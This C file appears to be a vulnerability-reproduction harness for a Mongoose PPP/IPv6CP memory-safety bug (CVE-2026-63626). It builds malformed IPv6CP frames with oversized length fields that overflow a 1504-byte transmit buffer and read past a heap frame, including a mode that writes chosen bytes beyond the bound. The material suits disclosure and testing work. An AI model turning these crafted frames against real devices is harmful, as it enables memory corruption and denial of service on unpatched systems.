/* Real-stack harness for CVE-2026-63626 / GHSA-pc66-j6r6-49x9.
 *
 * Built from the byte-exact pinned parent tree 8bb65c64926d (mongoose.c /
 * mongoose.h) with MG_ENABLE_TCPIP=1 MG_ENABLE_IPV6=1. Unlike the direct-call
 * harness under ../harness/, this drives the REAL ingress path:
 *
 *   mg_tcpip_qwrite() -> mg_mgr_poll() -> mg_tcpip_poll() -> mg_tcpip_rx()
 *     -> mg_l2_rx() -> mg_l2_ppp_rx() -> ppp_rx() -> ppp_handle_ipv6cp()
 *
 * with a plant-created mg_mgr and mg_tcpip_if (l2type PPP), a real
 * framesize-derived tx.buf (1504 bytes), and a real 8192-byte RX queue.
 * Frames are injected at 127.0.0.1-local process memory via the same qwrite()
 * API an interrupt-driven PPP/PPPoE driver uses; there is no socket,
 * listener, external probe or off-loopback traffic.
 *
 * Modes:
 *   info   - print real framesize / tx.len / gate state, no frames
 *   lcp    - one peer LCP Configure-ACK, print gate state (reachability)
 *   nolcp  - IPv6CP oversized-len frame WITHOUT the LCP gate (control)
 *   write  - LCP ACK then short IPv6CP frame, IFCID option, len=65535
 *            -> ASan WRITE of 65535 into the 1504-byte framesize tx.buf
 *   read   - LCP ACK then direct mg_l2_ppp_rx() on a 20-byte heap frame
 *            -> ASan READ in find_opt() from the real pinned source
 *   safe   - LCP ACK then a well-formed short IPv6CP frame (len=14)
 *            -> no ASan report, gwmac populated, normal path
 */
#include "mongoose.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Plant loopback driver: queue-based (rx == NULL), no hardware. */
static bool mock_init(struct mg_tcpip_if *ifp) { (void) ifp; return true; }
static size_t mock_tx(const void *buf, size_t len, struct mg_tcpip_if *ifp) {
  (void) buf; (void) ifp;
  return len;
}
static struct mg_tcpip_driver loopback_driver = {mock_init, mock_tx, NULL, NULL};

static uint16_t htons16(uint16_t v) { return (uint16_t) ((v >> 8) | (v << 8)); }

/* LCP Configure-ACK: code=2 id=1 len=4. Sets s_lcpup on the peer path. */
static const uint8_t LCP_ACK[10] = {
    0xff, 0x03,             /* HDLC addr, ctrl */
    0xc0, 0x21,             /* PPP proto: LCP */
    0x02, 0x01, 0x00, 0x04, /* Configure-ACK, id=1, len=4 */
    0x00, 0x00,             /* FCS placeholder (not validated on rx) */
};

/* Build a short IPv6CP Configure-Request raw frame (20 bytes).
 * HDLC(2) + PPP-proto(2) + IPv6CP(4) + options(10) + FCS(2) = 20. */
static void mk_ipv6cp(uint8_t *raw, uint16_t peer_len, int wellformed) {
  int i;
  raw[0] = 0xff; raw[1] = 0x03;          /* HDLC */
  raw[2] = 0x80; raw[3] = 0x57;          /* PPP proto: IPv6CP */
  raw[4] = 0x01; raw[5] = 0x01;          /* Configure-Request, id=1 */
  raw[6] = (uint8_t) (peer_len >> 8); raw[7] = (uint8_t) (peer_len & 0xff);
  if (wellformed) {
    raw[8] = 0x01; raw[9] = 0x0a;        /* IFCID option, len=10 */
    memset(raw + 10, 0x22, 8);           /* peer Interface-Id */
  } else {
    /* Alternating {0,2} option headers: find_opt() steps 2 bytes at a time
     * and walks to the end of the 20-byte heap allocation. */
    for (i = 8; i < 20; i++) raw[i] = (i & 1) ? 0x02 : 0x00;
  }
}

/* Build a large IPv6CP Configure-Request (rawlen bytes) with a valid IFCID
 * option and chosen bytes placed at raw offsets 1504 and 1521. Those map to
 * tx.buf[1504] and tx.buf[1521] (0 and 17 bytes past the real 1504-byte
 * framesize bound) because pay = tx.buf + 4 and data = ipv6cpp = raw + 4. */
static void mk_big_ipv6cp(uint8_t *raw, size_t rawlen, uint16_t peer_len) {
  memset(raw, 0x11, rawlen);
  raw[0] = 0xff; raw[1] = 0x03;
  raw[2] = 0x80; raw[3] = 0x57;
  raw[4] = 0x01; raw[5] = 0x01;
  raw[6] = (uint8_t) (peer_len >> 8); raw[7] = (uint8_t) (peer_len & 0xff);
  raw[8] = 0x01; raw[9] = 0x0a;
  memset(raw + 10, 0x22, 8);
  raw[1504] = 0x5a;
  raw[1521] = 0x3c;
  raw[rawlen - 2] = 0x00; raw[rawlen - 1] = 0x00; /* FCS placeholder */
}

static void inject(struct mg_tcpip_if *ifp, const uint8_t *frame, size_t len) {
  mg_tcpip_qwrite((void *) frame, len, ifp);
  mg_mgr_poll(ifp->mgr, 0);
}

int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "info";
  struct mg_mgr mgr;
  struct mg_tcpip_if ifp;
  uint8_t gw_before[8], gw_after[8];
  int gate;

  memset(&ifp, 0, sizeof(ifp));
  ifp.l2type = MG_TCPIP_L2_PPP;
  ifp.driver = &loopback_driver;
  memset(&mgr, 0, sizeof(mgr));
  mg_mgr_init(&mgr);
  mg_tcpip_init(&mgr, &ifp);
  ifp.state = MG_TCPIP_STATE_UP; /* established link: prevents 1s gate reset */

  gate = mg_l2_ppp_poll(&ifp, false) ? 1 : 0;
  printf("BUILD=pinned-parent-8bb65c64926d MODE=%s\n", mode);
  printf("FRAMESIZE=%u TX_LEN=%u L2TYPE=%d GATE_BEFORE=%d\n",
         (unsigned) ifp.framesize, (unsigned) ifp.tx.len,
         (int) ifp.l2type, gate);
  printf("OVERFLOW_65535=%ld\n", (long) 65535 - (long) ifp.tx.len);

  if (strcmp(mode, "info") == 0) goto done;

  if (strcmp(mode, "lcp") == 0) {
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    printf("LCP_GATE_AFTER=%d NRECV=%u\n",
           mg_l2_ppp_poll(&ifp, false) ? 1 : 0, (unsigned) ifp.nrecv);
    goto done;
  }

  if (strcmp(mode, "read") == 0) {
    uint8_t *frame = (uint8_t *) malloc(20);
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    printf("LCP_GATE_AFTER=%d\n", mg_l2_ppp_poll(&ifp, false) ? 1 : 0);
    mk_ipv6cp(frame, 0xffff, 0);
    /* Direct call to the REAL mg_l2_ppp_rx from the pinned tree, with a
     * 20-byte heap frame whose end find_opt() will cross. */
    {
      enum mg_l2proto proto = MG_TCPIP_L2PROTO_IPV4;
      struct mg_str pay = {0, 0}, raw = {(char *) frame, 20};
      mg_l2_ppp_rx(&ifp, &proto, &pay, &raw);
    }
    printf("READ_DRIVER_DONE\n");
    goto done;
  }

  /* Rung 4 re-measured on the real stack path. The framesize bound stays the
   * real 1504 from mg_l2_ppp_init(); only the backing allocation is extended
   * by 64 bytes of 0xcc canary so chosen bytes can be observed safely. */
  if (strcmp(mode, "canary") == 0) {
    uint8_t *big = (uint8_t *) malloc(2000 + 64); /* holds the full 2000-byte copy */
    uint8_t *frame = (uint8_t *) malloc(2000);
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    printf("LCP_GATE_AFTER=%d\n", mg_l2_ppp_poll(&ifp, false) ? 1 : 0);
    memset(big, 0xcc, 2000 + 64);
    mk_big_ipv6cp(frame, 2000, 2000);
    ifp.tx.buf = (char *) big; /* framesize / tx.len stay at the real 1504 */
    inject(&ifp, frame, 2000);
    printf("CANARY_MODE=canary FRAMESIZE=%u PEER_LEN=2000\n",
           (unsigned) ifp.framesize);
    printf("CAN0=%02x CAN17=%02x GW=%02x%02x%02x%02x%02x%02x%02x%02x\n",
           big[ifp.framesize], big[ifp.framesize + 17],
           ifp.gwmac[0], ifp.gwmac[1], ifp.gwmac[2], ifp.gwmac[3],
           ifp.gwmac[4], ifp.gwmac[5], ifp.gwmac[6], ifp.gwmac[7]);
    goto done;
  }

  /* nolcp / write / safe: inject a short IPv6CP frame through qwrite->poll. */
  memcpy(gw_before, ifp.gwmac, 8);
  if (strcmp(mode, "write") == 0) {
    uint8_t frame[20];
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    printf("LCP_GATE_AFTER=%d\n", mg_l2_ppp_poll(&ifp, false) ? 1 : 0);
    mk_ipv6cp(frame, 0xffff, 1);
    inject(&ifp, frame, sizeof(frame));
    printf("WRITE_DRIVER_DONE\n");
  } else if (strcmp(mode, "write-small") == 0) {
    uint8_t frame[20];
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    printf("LCP_GATE_AFTER=%d\n", mg_l2_ppp_poll(&ifp, false) ? 1 : 0);
    mk_ipv6cp(frame, 2000, 1);
    inject(&ifp, frame, sizeof(frame));
    printf("WRITE_SMALL_DRIVER_DONE\n");
  } else if (strcmp(mode, "safe") == 0) {
    uint8_t frame[20];
    inject(&ifp, LCP_ACK, sizeof(LCP_ACK));
    mk_ipv6cp(frame, 14, 1);
    inject(&ifp, frame, sizeof(frame));
    printf("SAFE_DRIVER_DONE\n");
  } else if (strcmp(mode, "nolcp") == 0) {
    uint8_t frame[20];
    mk_ipv6cp(frame, 0xffff, 1);
    inject(&ifp, frame, sizeof(frame));
    printf("NOLCP_DRIVER_DONE\n");
  } else {
    fprintf(stderr, "usage: %s info|lcp|nolcp|write|read|safe\n", argv[0]);
    return 99;
  }
  memcpy(gw_after, ifp.gwmac, 8);
  printf("GW_BEFORE=%02x%02x%02x%02x%02x%02x%02x%02x\n", gw_before[0],
         gw_before[1], gw_before[2], gw_before[3], gw_before[4],
         gw_before[5], gw_before[6], gw_before[7]);
  printf("GW_AFTER=%02x%02x%02x%02x%02x%02x%02x%02x\n", gw_after[0],
         gw_after[1], gw_after[2], gw_after[3], gw_after[4],
         gw_after[5], gw_after[6], gw_after[7]);

done:
  mg_mgr_free(&mgr);
  return 0;
}
